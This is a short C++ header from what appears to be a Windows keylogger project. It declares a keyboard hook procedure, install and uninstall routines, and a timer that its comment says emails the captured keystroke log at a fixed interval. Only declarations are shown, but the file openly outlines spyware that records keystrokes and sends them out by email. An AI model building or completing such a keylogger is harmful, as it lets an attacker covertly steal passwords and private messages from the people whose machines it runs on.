#ifndef __KEYHOOKS__H
#define __KEYHOOKS__H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.hpp"
#include "Timer.hpp"
#include "SendMail.hpp"

#define ms
namespace Hook{
    void send_mail_timer();
    LRESULT keyboard_proc(int n_code, WPARAM wparam, LPARAM lparam);
    bool install_hook();
    bool unistall_hook();
    bool is_hooked();
    static Timer timer_for_mail(500* 60, send_mail_timer, Timer::max_calls); //where we set an interval for send the keylogmsg to the email
}

#endif
